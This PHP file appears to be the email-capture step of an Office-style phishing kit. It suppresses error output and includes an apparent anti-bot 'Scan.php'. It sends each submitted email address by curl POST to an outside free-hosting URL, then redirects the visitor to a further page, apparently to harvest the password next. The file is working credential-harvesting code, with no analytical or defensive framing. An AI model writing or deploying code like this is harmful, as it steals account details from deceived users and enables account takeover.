<?php 
session_start();
error_reporting(0);
include 'helper.php';
include 'Scan.php';

	if(!isset($_POST['email'])) {
		header("Location: index.php");
	} 
	
	if(isset($_POST['email']))
	{
		$email = $_POST['email'];
		
		$data = array("UserName" => "$email");
		
		$URL='http://0200.000webhostapp.com/Offc/index.php';

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$URL);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30); //timeout after 30 seconds
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		$result=curl_exec($ch);
		$status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);   //get status code
		
		$resp = json_decode($result);
		
		if($resp->result == "true") {
			unset($_SESSION['error']);
			$_SESSION['email'] = $_POST['email'];
			header("Location: common2.php");
		}else{
			$_SESSION['error'] = "Error";
			header("Location: index.php");
		}
		curl_close($ch);
	}
?>